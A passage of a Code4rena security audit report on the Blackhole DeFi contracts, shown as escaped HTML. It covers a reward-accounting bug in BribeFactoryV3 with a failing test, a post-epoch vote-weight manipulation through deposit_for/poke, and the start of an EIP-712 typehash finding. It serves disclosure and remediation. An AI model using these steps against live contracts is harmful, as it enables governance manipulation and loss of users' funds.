class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecoveryAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erecoverERC20AndUpdateData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecoveryAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get final token rewards per epoch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This fails because the factory uses emergencyRecoverERC20, which does not update rewards\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esub\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecoveryAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Token rewards per epoch should be updated but weren\u0026#39;t\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTest Result\u003c/strong\u003e: The test fails with the following error, confirming the bug:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"55\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAssertionError: Expected \u0026quot;0\u0026quot; to be equal -100000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+ expected - actual\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e-  \u0026quot;_hex\u0026quot;: \u0026quot;-0x056bc75e2d63100000\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+  \u0026quot;_hex\u0026quot;: \u0026quot;0x00\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e   \u0026quot;_isBigNumber\u0026quot;: true\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eExplanation\u003c/strong\u003e:\u003c/p\u003e\n\u003cp\u003eThe test expects \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e to decrease by \u003ccode\u003e100 ether\u003c/code\u003e after calling \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e on \u003ccode\u003eBribeFactoryV3\u003c/code\u003e. However, because \u003ccode\u003eemergencyRecoverERC20\u003c/code\u003e is called instead, \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e remains unchanged (\u003ccode\u003e0\u003c/code\u003e), causing the test to fail.\u003c/p\u003e\n\u003cp\u003eThis demonstrates that the incorrect function call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e skips the critical update to \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e, leading to potential reward over-distribution.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-44\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-22\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-35\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/factories/BribeFactoryV3.sol#L199\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/factories/BribeFactoryV3.sol#L199\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids\" style=\"position:relative;\"\u003e\u003ca href=\"#m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids\" aria-label=\"m 12 epoch voting restrictions bypassed via deposit_for for blacklistednon whitelisted tokenids permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-283\"\u003e[M-12] Epoch voting restrictions bypassed via \u003ccode\u003edeposit_for()\u003c/code\u003e for blacklisted/non-whitelisted \u003ccode\u003etokenID\u003c/code\u003es\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-166\"\u003erayss\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VoterV3.sol#L174\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VoterV3.sol#L174\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L816\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L816\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-2\" aria-label=\"finding description and impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe vote function in VoterV3.sol restricts voting after the epoch ends, allowing only whitelisted \u003ccode\u003etokenIds\u003c/code\u003e (NFTs) or those meeting specific conditions (i.e., \u003ccode\u003eIAutoVotingEscrowManager(avm).tokenIdToAVMId(_tokenId) == 0\u003c/code\u003e) to continue voting. However, this restriction can be bypassed because the \u003ccode\u003edeposit_for\u003c/code\u003e function, which internally calls poke—does not enforce these same checks. As a result, even holders of non-whitelisted or blacklisted \u003ccode\u003etokenIds\u003c/code\u003e can call \u003ccode\u003edeposit_for\u003c/code\u003e after the epoch has ended. While this does not allow them to vote for new pools, it does let them increase the weight of their existing votes (i.e., the pools they had previously voted for) if their NFT balance has increased. This effectively constitutes a form of post-epoch voting and undermines the intended voting restrictions.\u003c/p\u003e\n\u003cp\u003eSince poke recalculates voting power based on the current NFT balance (\u003ccode\u003euint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId);\u003c/code\u003e), a user’s voting weight can increase if their NFT balance increases (which they can do by depositing). This allows them to effectively circumvent the protocol’s intended epoch-based voting restrictions and manipulate vote weights after the voting window closesons.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-8\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eEpoch ends: The protocol’s voting period finishes, and the vote function stops accepting new votes from non-whitelisted \u003ccode\u003etokenIds\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUser with non-whitelisted NFT: Alice holds an NFT that is not whitelisted (i.e., blacklisted) and thus can’t vote through the vote function anymore.\u003c/li\u003e\n\u003cli\u003eAlice calls \u003ccode\u003edeposit_for()\u003c/code\u003e: Although the epoch has ended and she cannot vote for new pools, Alice calls the \u003ccode\u003edeposit_for\u003c/code\u003e function with her NFT’s tokenId and passes an amount. This function internally triggers poke, which updates her vote weights.\u003c/li\u003e\n\u003cli\u003eBoosting vote weights: This allows Alice to increase the weight of her existing votes (to previously selected pools). Additionally, Alice could strategically vote with minimal weights to multiple pools during the active epoch, and then after the epoch ends, call \u003ccode\u003edeposit_for()\u003c/code\u003e to amplify those votes using her updated (larger) NFT balance—bypassing intended vote limitations (e.g, The epoch ends).\u003c/li\u003e\n\u003cli\u003eVotes updated: The protocol accepts the recalculated vote weights, allowing Alice to affect governance decisions even after the official voting period has ended.\u003c/li\u003e\n\u003cli\u003ePoking should be only allowed when epoch is active.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"impact-9\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUsers with non-whitelisted or blacklisted NFTs can bypass epoch restrictions by using the poke function after the epoch period ends.\u003c/li\u003e\n\u003cli\u003eUnauthorized vote recasting allows these users to increase their voting power outside the designated voting window.\u003c/li\u003e\n\u003cli\u003eMalicious actors could unfairly influence governance proposals beyond intended timeframes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"severity-justification-1\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-justification-1\" aria-label=\"severity justification 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Justification\u003c/h3\u003e\n\u003cp\u003eAccess control is broken. This issue is of medium severity because it enables users to bypass the core voting restrictions enforced by the protocol. The \u003ccode\u003evote()\u003c/code\u003e function is designed to block votes after the epoch ends unless specific conditions are met (such as the NFT being whitelisted or having no AVM mapping). However, the \u003ccode\u003epoke()\u003c/code\u003e function lacks these same restrictions, allowing users (including those with blacklisted or ineligible NFTs) to recast votes even after the epoch has concluded. Since \u003ccode\u003epoke()\u003c/code\u003e recalculates vote weights based on the current balance of the NFT, users can amplify their voting power post-deadline by increasing their NFT balance and calling \u003ccode\u003edeposit_for()\u003c/code\u003e, which calls poke. This undermines the intended finality of the voting period, introduces inconsistent access control, and opens the door for manipulation of governance outcomes.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement the same epoch and whitelist checks in the poke function as in the vote function to prevent unauthorized vote recasting after the epoch ends.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole disputed\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation\" aria-label=\"m 13 eip 712 domain type hash mismatch breaks signature based delegation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-35\"\u003e[M-13] EIP-712 domain type hash mismatch breaks signature-based delegation\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-48\"\u003enewspacexyz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1205\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1205\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1327-L1335\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1327-L1335\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-9\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-9\" aria-label=\"finding description 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThere is a mistake in how the \u003ccode\u003eDOMAIN_TYPEHASH\u003c/code\u003e constant is defined and used in the \u003ccode\u003eVotingEscrow\u003c/code\u003e contract.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOMAIN_TYPEHASH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;EIP712Domain(string name,uint256 chainId,address verifyingContract)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when building the domain separator, the contract includes an additional parameter:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edomainSeparator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOMAIN_TYPEHASH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eversion\u003c/span\u003e\u003cspan 